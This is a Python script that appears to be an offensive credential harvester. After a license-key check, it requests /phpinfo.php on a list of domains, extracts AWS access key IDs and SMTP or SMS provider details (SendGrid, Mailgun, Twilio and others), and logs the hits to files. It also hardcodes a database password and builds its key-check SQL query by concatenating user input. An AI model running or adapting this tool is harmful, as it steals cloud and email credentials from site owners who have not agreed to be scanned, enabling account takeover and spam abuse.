import requests
from sys import argv
from time import sleep
from colorama import init, Fore
import re
from treelib import Node, Tree
import treelib
import os
from datetime import date
import tkinter as tk
from tkinter import filedialog
import subprocess
import ctypes
from os import system
import pymysql

def clear():
	os.system("cls" if os.name == "nt" else "clear")

def main():
	clear()
	init()
	connection = pymysql.connect(
		user='toronto', 
		passwd='Kaka123.', 
		host='mysql-toronto.alwaysdata.net', 
		database='toronto_apache'
		)
	logo = f"""
	{Fore.RED}
	██   █ ▄▄  ██   ▄█▄     ▄  █ ▄███▄         ▄   ▄█ 
	█ █  █   █ █ █  █▀ ▀▄  █   █ █▀   ▀         █  ██ 
	█▄▄█ █▀▀▀  █▄▄█ █   ▀  ██▀▀█ ██▄▄      █     █ ██ 
	█  █ █     █  █ █▄  ▄▀ █   █ █▄   ▄▀    █    █ ▐█ 
	   █  █       █ ▀███▀     █  ▀███▀       █  █   ▐ 
	  █    ▀     █           ▀                █▐      
	 ▀          ▀                             ▐                         
			  {Fore.YELLOW}[{Fore.RED}@{Fore.YELLOW}z01youl]
			"""
	print(logo)
	key = input("[Key Access]: ")
	try:
		cursor = connection.cursor()
		query = ("SELECT * FROM keys_access WHERE key_access = (" + key + ")")
		cursor.execute(query)
		connect = [str(i) for i in cursor]
		if connect:
			clear()
			print(f"""
	{Fore.RED}
	██   █ ▄▄  ██   ▄█▄     ▄  █ ▄███▄         ▄   ▄█ 
	█ █  █   █ █ █  █▀ ▀▄  █   █ █▀   ▀         █  ██ 
	█▄▄█ █▀▀▀  █▄▄█ █   ▀  ██▀▀█ ██▄▄      █     █ ██ 
	█  █ █     █  █ █▄  ▄▀ █   █ █▄   ▄▀    █    █ ▐█ 
	   █  █       █ ▀███▀     █  ▀███▀       █  █   ▐ 
	  █    ▀     █           ▀                █▐      
	 ▀          ▀                             ▐                         
			  {Fore.YELLOW}[{Fore.RED}@{Fore.YELLOW}z01youl]

	[{Fore.RED}Upload NDDs{Fore.YELLOW}]: {Fore.RED}1

				""")
			choice = input("[@]> ")

			if choice == "1":
				tree = Tree()
				root = tk.Tk()
				root.withdraw()
				file = filedialog.askopenfilename()
				if file:
					with open(file, "r", encoding="utf8") as file:
						v = file.readlines()
						x = []
						for i in v:
							x.append(i.strip())
				try:
					name = str(file).split("/")[2].split("' mode='r'")[0]
				except IndexError:
					exit(1)
				tree.create_node(f"{Fore.YELLOW}[{Fore.YELLOW}Session{Fore.YELLOW}]{Fore.RESET}", "session")
				tree.create_node(f"{Fore.YELLOW}[{Fore.GREEN}File{Fore.YELLOW}]: {Fore.RESET}{name}", parent="session")
				tree.create_node(f"{Fore.YELLOW}[{Fore.GREEN}NDDs{Fore.YELLOW}]: {Fore.RESET}{len(x)}", parent="session")
				tree.show()
				checked = 0
				hit = 0
				for i in x:
					checked += 1
					title = f"[NDDs]: {checked}/{len(x)} - [HITs]: {hit}" 
					os.system("title " + str(title))
					tree = Tree()
					try:
						req = requests.get("http://" + i + "/phpinfo.php", headers={'User-Agent': 'Mozilla/5.0'})
						a = req.text
						if '<tr><td class="e">Registered Stream Socket Transports</td><td class="v">tcp' in a:
							hit += 1
							tree.create_node(f"{Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}]{Fore.GREEN} HIT {Fore.YELLOW}[{Fore.GREEN}+{Fore.YELLOW}]{Fore.RESET}", "menu")
							tree.create_node(f"{Fore.YELLOW}[{Fore.GREEN}URL{Fore.YELLOW}]{Fore.RESET}: " + i, "target", parent="menu")
							if re.findall(r"smtp\.sendgrid\.net|smtp\.mailgun\.org|smtp-relay\.sendinblue\.com|smtp.tipimail.com|smtp.sparkpostmail.com|vonage|nexmo|twilo|smtp.deliverabilitymanager.net|smtp.mailendo.com|mail.smtpeter.com|mail.smtp2go.com|smtp.socketlabs.com|secure.emailsrvr.com|mail.infomaniak.com|smtp.pepipost.com|smtp.elasticemail.com|smtp25.elasticemail.com|pro.turbo-smtp.com|smtp-pulse.com|in-v3.mailjet.com", a):
								today = date.today()
								d4 = today.strftime((str(req.url).split("://")[1]).split("/")[0] + "-%d-%Y")
								dirName = f"hit/other/" 
								path = "hit/other/"
								file = open(os.path.join(path, d4 + ".txt"), "a+")
								tree.create_node(f"{Fore.YELLOW}[{Fore.GREEN}INFO{Fore.YELLOW}]{Fore.RESET}", "info", parent="target")
								try:
									for y in re.findall(r"smtp\.sendgrid\.net|smtp\.mailgun\.org|smtp-relay\.sendinblue\.com|smtp.tipimail.com|smtp.sparkpostmail.com|vonage|nexmo|twilo|smtp.deliverabilitymanager.net|smtp.mailendo.com|mail.smtpeter.com|mail.smtp2go.com|smtp.socketlabs.com|secure.emailsrvr.com|mail.infomaniak.com|smtp.pepipost.com|smtp.elasticemail.com|smtp25.elasticemail.com|pro.turbo-smtp.com|smtp-pulse.com|in-v3.mailjet.com", a):
										print(f"{Fore.BLUE}")
										tree.create_node(f"{Fore.BLUE}{y}{Fore.RESET}", parent="info")
										print(f"{Fore.RESET}")
								except treelib.exceptions.DuplicatedNodeIdError:
									pass

							if re.findall(r"AKIA[A-Z0-9]{16}", a):
								today = date.today()
								d4 = today.strftime((str(req.url).split("://")[1]).split("/")[0] + "-%d-%Y")
								dirName = f"hit/akia/" 
								path = "hit/akia/"
								file = open(os.path.join(path, d4 + ".txt"), "a+")
								tree.create_node(f"{Fore.YELLOW}[{Fore.GREEN}INFO{Fore.YELLOW}]{Fore.RESET}", "info", parent="target")
								try:
									for y in re.findall(r"AKIA[A-Z0-9]{16}", a):
										print(f"{Fore.BLUE}")
										tree.create_node(f"{Fore.BLUE}{y}{Fore.RESET}", parent="info")
										print(f"{Fore.RESET}")
								except treelib.exceptions.DuplicatedNodeIdError:
									pass

							else:
								today = date.today()
								d4 = today.strftime((str(req.url).split("://")[1]).split("/")[0] + "-%d-%Y")
								dirName = f"hit/other/" 
								path = "hit/other/"
								file = open(os.path.join(path, d4 + ".txt"), "a+")
							
							tree.show()

						sleep(0.1)
					except requests.exceptions.ConnectionError:
						pass
	except pymysql.err.OperationalError:
		pass
	except pymysql.err.ProgrammingError:
		pass

main()
